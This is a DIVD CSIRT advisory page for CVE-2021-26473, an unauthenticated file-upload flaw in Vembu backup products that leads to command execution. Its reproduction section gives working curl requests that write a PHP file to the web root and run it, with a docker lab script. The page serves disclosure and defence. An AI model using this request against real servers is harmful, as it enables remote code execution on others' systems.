<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">

    <base href="/">

    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Unauthenticated arbitrary file upload and command execution in Vembu products | DIVD CSIRT</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Unauthenticated arbitrary file upload and command execution in Vembu products" />
<meta name="author" content="Frank Breedijk" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Summary The http API located at /sgwebservice_o.php action logFilePath allows an attacker to write arbitrary files in the context of the web server process. THese files can then be executed remotely by calling the file via the web server" />
<meta property="og:description" content="Summary The http API located at /sgwebservice_o.php action logFilePath allows an attacker to write arbitrary files in the context of the web server process. THese files can then be executed remotely by calling the file via the web server" />
<meta property="og:site_name" content="DIVD CSIRT" />
<script type="application/ld+json">
{"headline":"Unauthenticated arbitrary file upload and command execution in Vembu products","@type":"WebPage","author":{"@type":"Person","name":"Frank Breedijk"},"description":"Summary The http API located at /sgwebservice_o.php action logFilePath allows an attacker to write arbitrary files in the context of the web server process. THese files can then be executed remotely by calling the file via the web server","url":"/cves/CVE-2021-26473/","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#157878">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="stylesheet" href="assets/css/menu.css">
    <link rel="stylesheet" href="assets/css/main.css">
</head>
<body>
    <a id="skip-to-content" href="#content">Skip to the content.</a>


<!-- Header -->
<header id="header">
    
        
            <span class="logo"><a href="/">Home</a> / <a href="/cves/">CVEs</a> / Cve-2021-26473</span>
        
    
</header>



<!-- Heading -->
<div id="banner" >
  <div class="inner">
    <h1 class="project-name">DIVD CSIRT</h1>
    <p class="project-tagline">Making the internet safer through Coordinated Vulnerability Disclosure</p>
  </div>
</div>



<nav class="nav nav--cen">
	<a id="menuBtn" class="icon">
		<i class="fa fa-bars"></i> Menu
	  </a>
	<ul class="menu" id="nav_menu">
		
			
				
			    	<li class="menu-item has-children">
						<a href="/" >
							Home <span class="dropdown-icon"></span>
						</a>
	   					<ul class="sub-menu">
					    	
		    					<li class="menu-item">
			    					<a href="https://www.divd.nl">DIVD</a>
			    				</li>
				    		
		    					<li class="menu-item">
			    					<a href="/">CSIRT</a>
			    				</li>
				    		
				    	</ul>
			    	</li>
				
			
		
			
		    	<li class="menu-item has-children">
		    		<a href="/cases/" > 
						Cases <span class="dropdown-icon"></span>
					</a>
   					<ul class="sub-menu">
   						
				    	
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00027/" >
			    						DIVD-2021-00027 - Apache HTTP 2.4.49 Path Traversal and File Disclosure<br>
			    						Apache fixes actively exploited web server zero-day...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00022/" >
			    						DIVD-2021-00022 - Exchange ProxyShell and ProxyOracle<br>
			    						New vulnerabilities in Microsoft Exchange...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00017/" >
			    						DIVD-2021-00017 â€“ SolarWinds N-able N-central agent vulnerabilities<br>
			    						DIVD recommends updating N-able to version 2021.1 HF6 or higher....
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00015/" >
			    						DIVD-2021-00015 - Telegram OD<br>
			    						Telegram group shares stolen credentials....
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00014/" >
			    						DIVD-2021-00014 - Kaseya Unitrends<br>
			    						DIVD recommends not exposing the on-premise Kaseya Unitrends servers to the...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00012/" >
			    						DIVD-2021-00012 - Warehouse Botnet<br>
			    						Botnet stolen credentials...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00011/" >
			    						DIVD-2021-00011 - Kaseya VSA Limited Disclosure<br>
			    						Multiple vulnerabilities discovered in Kaseya VSA....
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00010/" >
			    						DIVD-2021-00010 - vCenter Server PreAuth RCE<br>
			    						A PreAuth RCE vulnerability has been found in vCenter Server...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00007/" >
			    						DIVD-2021-00007 - EA Origin XSS and RCE 1-click<br>
			    						DIVD recommends updating the Origin client and don't click untrusted Origin...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00005/" >
			    						DIVD-2021-00005 - Pulse Secure PreAuth RCE<br>
			    						A PreAuth RCE vulnerability has been found in Pulse Connect Secure...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00004/" >
			    						DIVD-2021-00004 - Gelekte phishing gegevens / Leaked phishing credentials<br>
			    						A list of credentials that phishers gained from victims has leaked and has ...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00002/" >
			    						DIVD-2021-00002 - Kaseya VSA<br>
			    						Kaseya recommends disabling the on-premise Kaseya VSA servers immediately....
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2021-00001/" >
			    						DIVD-2021-00001 - Microsoft on-prem Exchange Servers<br>
			    						On-prem Exchange Servers targeted with 0-day exploits...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00014/" >
			    						DIVD-2020-00014 - SolarWinds Orion<br>
			    						SolarWinds Orion API authentication bypass...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00013/" >
			    						DIVD-2020-00013 - Gelekte phishing wachtwoorden / Leaked phishing credentia<br>
			    						A list of credentials that phishers gained from victims has leaked and has ...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00012/" >
			    						DIVD-2020-00012 - 49 000 vulnerable Fortinet VPN devices<br>
			    						A list of 49 577 vulnerable Fortinet devices leaked online...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00011/" >
			    						DIVD-2020-00011 - Four critical vulnerabilities in Vembu BDR<br>
			    						Four critical vulnerabilities in Vembu BDR...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00010/" >
			    						DIVD-2020-00010 - wpDiscuz plugin Remote Code Excution<br>
			    						WordPress Plugin wpDiscuz has a vulnerability that alllows attackers to tak...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00009/" >
			    						DIVD-2020-00009 - Pulse Secure VPN enterprise  Leak<br>
			    						Data dumped from compromised Pulse Secure VPN enterprise servers....
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00008/" >
			    						DIVD-2020-00008 - 313 000 Wordpress sites scanned<br>
			    						313 000 .NL domains running Wordpress scanned....
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00007/" >
			    						DIVD-2020-00007 - Citrix ShareFile<br>
			    						Citrix ShareFile storage zones Controller multiple security updates...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00006/" >
			    						DIVD-2020-00006 - SMBv3 Server Compression Transform Header Memory Corrupti<br>
			    						SMBv3 Server Compression Transform Header Memory Corruption...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00005/" >
			    						DIVD-2020-00005 - Apache Tomcat AJP File Read/Inclusion Vulnerability<br>
			    						Apache Tomcat AJP File Read/Inclusion Vulnerability...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00004/" >
			    						DIVD-2020-00004 - List of Mirai botnet victims published with credentials<br>
			    						List of Mirai botnet victims published with credentials...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00003/" >
			    						DIVD-2020-00003 - Microsoft RDP Gateway vulnerable for Bluegate RCE<br>
			    						Exploits available for MS RDP Gateway Bluegate...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00002/" >
			    						DIVD-2020-00002 - Wildcard certificaten Citrix ADC<br>
			    						Wildcard Certificates Citrix ADC...
			    					</a>
			    				</li>
			    			
			    		
		    				
		    					<li class="menu-item">
			    					<a href="/cases/DIVD-2020-00001/" >
			    						DIVD-2020-00001 - Citrix ADC<br>
			    						Citrix ADC...
			    					</a>
			    				</li>
			    			
			    		
			    	</ul>
		    	</li>
			
		
			
				
		    	<li class="menu-item has-children">
		    		<a href="/cves/" > 
						CVEs <span class="dropdown-icon"></span>
					</a>
   					<ul class="sub-menu">
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-40387/" > CVE-2021-40387 - Authenticated Remote Code Execution in UniTrends Server  < v...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-40386/" > CVE-2021-40386 - Undisclosed critical vulnerability in Unitrends Client, curr...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-40385/" > CVE-2021-40385 - Privilege escalation from read-only to administrator in web ...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30201/" > CVE-2021-30201 - Authenticated XML External Entity vulnerability in Kaseya VS...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30121/" > CVE-2021-30121 - Authenticated local file inclusion in Kaseya VSA < v9.5.6...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30120/" > CVE-2021-30120 - 2FA bypass in Kaseya VSA <= v9.5.6...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30119/" > CVE-2021-30119 - Authenticated Authenticated reflective XSS in Kaseya VSA <= ...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30118/" > CVE-2021-30118 - Unautheticated RCE in Kaseya VSA < v9.5.5...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30117/" > CVE-2021-30117 - Autheticated SQL injection in Kaseya VSA < v9.5.6...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/cves/CVE-2021-30116/" > CVE-2021-30116 - Unautheticated credential leak and business logic flaw in Ka...</a>
							    </li>
							
						
							
						
							
						
							
						
							
						
			    	</ul>
		    	</li>
			
		
			
		    	<li class="menu-item has-children">
		    		<a href="/blog/" > 
						Blog <span class="dropdown-icon"></span>
					</a>
   					<ul class="sub-menu">
						
							
							    <li class="menu-item">
							        <a href="/2021/10/07/Apache-HTTP-Server-CVE-2021-41773-Update/" > 2021-10-07 : Apache HTTP 2.4.49 Path Traversal and File Disclosure Update...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/10/05/Apache-HTTP-Server-CVE-2021-41773/" > 2021-10-05 : Apache HTTP 2.4.49 Path Traversal and File Disclosure...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/08/26/ProxyShell-and-ProxyOracle/" > 2021-08-26 : Exchange ProxyShell and ProxyOracle...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/08/26/Kaseya-Unitrends-update/" > 2021-08-26 : Kaseya Unitrends update...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/08/25/Vembu-BDR-Full-Disclosure/" > 2021-08-25 : Vembu BDR Full Disclosure...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/08/20/Social-Media-Consolidation/" > 2021-08-20 : Social media consolidation...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/08/20/Planned-Vembu-Full-Disclosure/" > 2021-08-20 : Planned Vembu Full Disclosure...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/07/07/Kaseya-Limited-Disclosure/" > 2021-07-07 : Kaseya VSA Limited Disclosure...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/07/06/Kaseya-Case-Update-3/" > 2021-07-06 : Kaseya Case Update 3...</a>
							    </li>
							
						
							
							    <li class="menu-item">
							        <a href="/2021/07/04/Kaseya-Case-Update-2/" > 2021-07-04 : Kaseya Case Update 2...</a>
							    </li>
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
							
						
					    <li class="menu-item">
					        <a href="/blog"> More...</a>
					    </li>
			    	</ul>
		    	</li>
			
		
			
				
				<li class="menu-item">
					<a href="https://www.divd.nl/donate/" >
						Donate
					</a>
				</li>
				
			
		
			
				
				<li class="menu-item">
					<a href="/feed.xml" >
						RSS
					</a>
				</li>
				
			
		
			
				
				<li class="menu-item">
					<a href="/contact/" >
						Contact
					</a>
				</li>
				
			
		
	</ul>
</nav>


<section id="main" class="wrapper">
    <div id="content" class="inner content">
        <h1>CVE-2021-26473 - Unauthenticated arbitrary file upload and command execution in Vembu products</h1>

<table>
	<tbody>
	    <tr>
			<td> CVE </td><td> <a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26473' class='cve secinfo'>CVE-2021-26473</a> </td>
		</tr>
		<tr>
			<td> Discovered by </td>
			<td>
				<ul>
					<li>
							
								<a href='https://www.divd.nl/team/Wietse Boonstra/'>Wietse Boonstra</a>
							
						</li>
					
				</ul>
			</td>
		</tr>
		
			<tr>
				<td> (Additional) researcher(s) </td>
				<td>
					<ul>
						<li>
								
									<a href='https://www.divd.nl/team/Wietse Boonstra/'>Wietse Boonstra</a>
								
							</li>
						<li>
								
									<a href='https://www.divd.nl/team/Frank Breedijk/'>Frank Breedijk</a>
								
							</li>
						
					</ul>
				</td>
			</tr>
		
		
			<tr>
				<td> Products </td>
				<td> 
					<ul>
					
						<li>VembuBDR</li>
					
						<li>VembuOffsiteDR</li>
					
						<li>Other products in this family may also be effected</li>
					 
				</td>
			</tr>
		
		
			<tr>
				<td>  Versions </td>
				<td> 
					<ul>
						
							<li>VembuBDR v4.2.0.1</li>
						
							<li>VembuBDR v4.2.0</li>
						
							<li>VembuBDR v4.1.0</li>
						
							<li>VembuBDR v4.0.2</li>
						
							<li>VembuBDR v4.0.1</li>
						
							<li>VembuBDR v4.0.0</li>
						
							<li>VembuBDR v3.9.1 Update1</li>
						
							<li>VembuBDR v3.9.0 Update1</li>
						
							<li>VembuBDR v3.9.0</li>
						
							<li>VembuBDR v3.8.0</li>
						
							<li>VembuBDR v3.7.0</li>
						
							<li>VembuBDR v3.5.0.0</li>
						
							<li>VembuOffsiteDR v4.2.0.1</li>
						
							<li>VembuOffsiteDR v4.2.0</li>
						
							<li>Other products and versions of products in this family may also be effected</li>
						
					</ul>
				</td>
			</tr>
		
		<tr>
				<td> Page author </td>
				<td>
					
						<a href='https://www.divd.nl/team/Frank Breedijk/'>Frank Breedijk</a>
					
				</td>
			</tr>
		
		<tr>
			<td> CVSS Base Score </td>
			<td> <a href=''></a></td>
		</tr>
		
	</tbody>
</table>

<h2 id="summary">Summary</h2>
<p>The http API located at /sgwebservice_o.php action logFilePath allows an attacker to write arbitrary files in the context of the web server process. THese files can then be executed remotely by calling the file via the web server</p>

<h2 id="how-to-reproduce">How to reproduce</h2>
<p>Step 1:Start up a docker environment (see below)</p>

<p>Step 2: In a different terminal run the following command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="s1">'http://localhost:6060/sgwebservice_o.php?Action=logFilePath&amp;path=./my_php_info.php&amp;value=%3C%3Fphp%20phpinfo%28%29%20%3F%3E%0A'</span>
 
&lt;StoreGrid&gt;&lt;Message <span class="nv">Error</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">Message</span><span class="o">=</span><span class="s2">"Successfully written."</span> <span class="nv">Code</span><span class="o">=</span><span class="s2">"500"</span> /&gt;&lt;/StoreGrid&gt; 
</code></pre></div></div>

<p>Step 3: validate that a file was written:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nv">$ </span>docker <span class="nb">exec </span>VembuBDR4201 /bin/bash <span class="nt">-c</span> <span class="s2">"cd /home/vembubdr/Vembu/VembuBDR/htmlgui;ls -l my_*;echo ---;cat my_*;echo ---"</span>
<span class="nt">-rw-r--r--</span> 1 www-data www-data 19 Feb 11 15:35 my_php_info.php
<span class="nt">---</span>
&lt;?php phpinfo<span class="o">()</span> ?&gt;
<span class="nt">---</span>
</code></pre></div></div>

<p>Call the script to get command execution:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="s1">'http://localhost:6060/my_php_info.php'</span>
&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
body <span class="o">{</span>background-color: <span class="c">#fff; color: #222; font-family: sans-serif;}</span>
pre <span class="o">{</span>margin: 0<span class="p">;</span> font-family: monospace<span class="p">;</span><span class="o">}</span>
a:link <span class="o">{</span>color: <span class="c">#009; text-decoration: none; background-color: #fff;}</span>
a:hover <span class="o">{</span>text-decoration: underline<span class="p">;</span><span class="o">}</span>
table <span class="o">{</span>border-collapse: collapse<span class="p">;</span> border: 0<span class="p">;</span> width: 934px<span class="p">;</span> box-shadow: 1px 2px 3px <span class="c">#ccc;}</span>
.center <span class="o">{</span>text-align: center<span class="p">;</span><span class="o">}</span>
.center table <span class="o">{</span>margin: 1em auto<span class="p">;</span> text-align: left<span class="p">;</span><span class="o">}</span>
.center th <span class="o">{</span>text-align: center <span class="o">!</span>important<span class="p">;</span><span class="o">}</span>
td, th <span class="o">{</span>border: 1px solid <span class="c">#666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}</span>
th <span class="o">{</span>position: sticky<span class="p">;</span> top: 0<span class="p">;</span> background: inherit<span class="p">;</span><span class="o">}</span>
h1 <span class="o">{</span>font-size: 150%<span class="p">;</span><span class="o">}</span>
h2 <span class="o">{</span>font-size: 125%<span class="p">;</span><span class="o">}</span>
.p <span class="o">{</span>text-align: left<span class="p">;</span><span class="o">}</span>
.e <span class="o">{</span>background-color: <span class="c">#ccf; width: 300px; font-weight: bold;}</span>
.h <span class="o">{</span>background-color: <span class="c">#99c; font-weight: bold;}</span>
.v <span class="o">{</span>background-color: <span class="c">#ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}</span>
.v i <span class="o">{</span>color: <span class="c">#999;}</span>
img <span class="o">{</span>float: right<span class="p">;</span> border: 0<span class="p">;</span><span class="o">}</span>
hr <span class="o">{</span>width: 934px<span class="p">;</span> background-color: <span class="c">#ccc; border: 0; height: 1px;}</span>
&lt;/style&gt;
&lt;title&gt;PHP 7.4.3 - phpinfo<span class="o">()</span>&lt;/title&gt;&lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"ROBOTS"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"NOINDEX,NOFOLLOW,NOARCHIVE"</span> /&gt;&lt;/head&gt;
â€¦
</code></pre></div></div>

<h2 id="impact">Impact</h2>
<p>This vulnerability allows an attacker to upload an arbitrary file in the context of the web server and then execute it.</p>

<h2 id="about-the-docker-test-environment">About the docker test environment.</h2>
<p>In order to set up the docker test environment, we used the following script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
 
<span class="c"># Network</span>
<span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>docker network <span class="nb">ls</span> |grep vembu-netowrk |wc <span class="nt">-l</span> <span class="si">)</span> <span class="nt">-lt</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">then
  </span>docker network create <span class="nt">--subnet</span><span class="o">=</span>172.18.0.0/16 vembu-network
<span class="k">fi</span>
 
<span class="c"># Start Database container</span>
<span class="nb">mkdir </span>DB
<span class="k">while</span> <span class="o">[[</span> <span class="si">$(</span>docker ps <span class="nt">-a</span> |grep VembuDatabase|wc <span class="nt">-l</span><span class="si">)</span> <span class="nt">-ge</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">do
  </span>docker <span class="nb">kill </span>VembuDatabase
  docker <span class="nb">rm </span>VembuDatabase
  <span class="nb">sleep </span>1
<span class="k">done
</span>docker run <span class="nt">--name</span> VembuDatabase <span class="nt">--network</span> vembu-network <span class="nt">--ip</span> 172.18.0.2 <span class="nt">-p</span> 5432:5432 <span class="nt">-d</span> <span class="nt">-e</span> <span class="nv">POSTGRES_PASSWORD</span><span class="o">=</span>admin <span class="nt">-e</span> <span class="nv">POSTGRES_USER</span><span class="o">=</span>postgres <span class="nt">-e</span> <span class="nv">POSTGRES_DB</span><span class="o">=</span>SGDatabase <span class="nt">-v</span>  <span class="nv">$PWD</span>/DB:/vembu vembubdr/bdr-latest:psql-latest
 
<span class="c"># Wait for database port to open</span>
<span class="nb">echo</span> <span class="nt">-c</span> <span class="s2">"Waiting for database to become available..."</span>
<span class="k">while</span> <span class="o">!</span> <span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo &gt; /dev/tcp/localhost/5432"</span> <span class="p">;</span> <span class="k">do 
  </span><span class="nb">echo</span> <span class="nt">-c</span> <span class="s2">"."</span>
  <span class="nb">sleep </span>1<span class="p">;</span> 
<span class="k">done
</span><span class="nb">echo</span>
 
<span class="c"># Start APP container</span>
<span class="nb">mkdir </span>APP
<span class="k">while</span> <span class="o">[[</span> <span class="si">$(</span>docker ps <span class="nt">-a</span> |grep VembuBDR4201|wc <span class="nt">-l</span><span class="si">)</span> <span class="nt">-ge</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">do
  </span>docker <span class="nb">kill </span>VembuBDR4201
  docker <span class="nb">rm </span>VembuBDR4201
  <span class="nb">sleep </span>1
<span class="k">done
 
</span>docker run <span class="nt">--name</span> VembuBDR4201 <span class="nt">--network</span> vembu-network <span class="nt">--ip</span> 172.18.0.3 <span class="nt">--add-host</span> VembuDatabase:172.18.0.2 <span class="nt">--privileged</span><span class="o">=</span><span class="nb">true</span> <span class="nt">-i</span> <span class="nt">-t</span> <span class="nt">-d</span> <span class="nt">--device</span> /dev/fuse <span class="nt">--privileged</span> <span class="nt">-p</span> 6060:6060 <span class="nt">-p</span> 32004:32004 <span class="nt">-v</span> <span class="nv">$PWD</span>/APP:/vembu vembubdr/bdr-latest:vembubdr-4201-u1
 
<span class="c"># Wait for app port to open</span>
<span class="nb">echo</span> <span class="nt">-c</span> <span class="s2">"Waiting for application to become available..."</span>
<span class="k">while</span> <span class="o">!</span> <span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo &gt; /dev/tcp/localhost/6060"</span> <span class="p">;</span> <span class="k">do 
  </span><span class="nb">echo</span> <span class="nt">-c</span> <span class="s2">"."</span>
  <span class="nb">sleep </span>1<span class="p">;</span> 
<span class="k">done
</span><span class="nb">echo</span> 
</code></pre></div></div>
 		

<br>



    </div>
</section>


<footer id="footer">
    <div class="inner">
        <div class="content">
            <ul class="plain">
                <li><a href="https://twitter.com/DIVDnl"><i class="icon fa-twitter">&nbsp;</i>Twitter</a></li>
                
                <li><a href="https://www.linkedin.com/company/divd-nl"><i class="icon fa-linkedin">&nbsp;</i>LinkedIn</a></li>
            </ul>
        </div>
    </div>
</footer>
<!-- Scripts -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/browser.min.js"></script>
<script src="assets/js/breakpoints.min.js"></script>
<script src="assets/js/util.js"></script>
<script src="assets/js/main.js"></script>


</body>
</html>

